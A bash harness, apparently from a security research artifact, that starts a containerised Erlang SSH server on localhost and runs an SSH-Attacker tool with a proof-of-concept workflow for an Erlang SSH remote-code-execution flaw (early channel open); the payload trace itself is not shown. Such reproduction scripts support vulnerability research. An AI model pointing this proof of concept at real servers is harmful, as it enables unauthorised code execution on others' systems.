#!/bin/bash

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Set up variables for directories
SCRIPTS_DIR=$(dirname "$(readlink -f "$0")")
ARTIFACTS_DIR=$(readlink -f "$SCRIPTS_DIR/..")
cd $ARTIFACTS_DIR
LOG_FILE="$ARTIFACTS_DIR/logs/test_strict_kex_violation_$(date +'%Y%m%d_%H%M%S').log"
rm -rf $LOG_FILE && mkdir -p "$ARTIFACTS_DIR/logs" && touch $LOG_FILE

function log() {
    echo -e "$1" | tee -a $LOG_FILE
}

# Check that the script is invoked without sudo
if [[ $SUDO_USER ]]; then
   log "${RED}[!] This script should not be run with sudo.${NC}"
   exit 1
fi

function start_erlang_ssh() {
    log "${GREEN}[+] Starting Erlang SSH server...${NC}"
    cd "$ARTIFACTS_DIR/code/impl/erlang-ssh"
    docker compose up -d |& tee -a $LOG_FILE
    SERVER_HOST="127.0.0.1"
    SERVER_PORT=$(docker compose port server 22 | awk -F: '{print $2}')
    cd "$ARTIFACTS_DIR"
}

function run_poc() {
    POC_CONFIG="$ARTIFACTS_DIR/code/ssh_attacker/resources/configs/kex_ecdh_config.xml"
    POC_WORKFLOW_TRACE="$ARTIFACTS_DIR/code/pocs/erlang_rce/erlang_early_channel_open.xml"
    log "${GREEN}[+] Running PoC...${NC}"
    log "    - Server address: $SERVER_HOST:$SERVER_PORT"
    log "    - Workflow trace: $POC_WORKFLOW_TRACE"
    docker run --rm \
        -v "$POC_WORKFLOW_TRACE":/trace.xml \
        -v "$POC_CONFIG":/config.xml \
        --network host \
        --name ssh-attacker \
        ssh-attacker:latest \
        -connect "$SERVER_HOST:$SERVER_PORT" \
        -config /config.xml \
        -workflow_input /trace.xml |& tee -a $LOG_FILE
    log "${GREEN}[+] SSH-Attacker client run completed.${NC}"
    log "    - If the PoC was successful, you should see that the workflow trace was executed as planned in the tool's last output line."
}

function stop_containers() {
    docker ps -q --filter "name=ssh-attacker" | xargs -r docker stop |& tee -a $LOG_FILE
    log "${GREEN}[+] Stopping Erlang SSH server...${NC}"
    cd "$ARTIFACTS_DIR/code/impl/erlang-ssh"
    docker compose down |& tee -a $LOG_FILE
    cd "$ARTIFACTS_DIR"
}

trap 'stop_containers' EXIT
start_erlang_ssh
run_poc
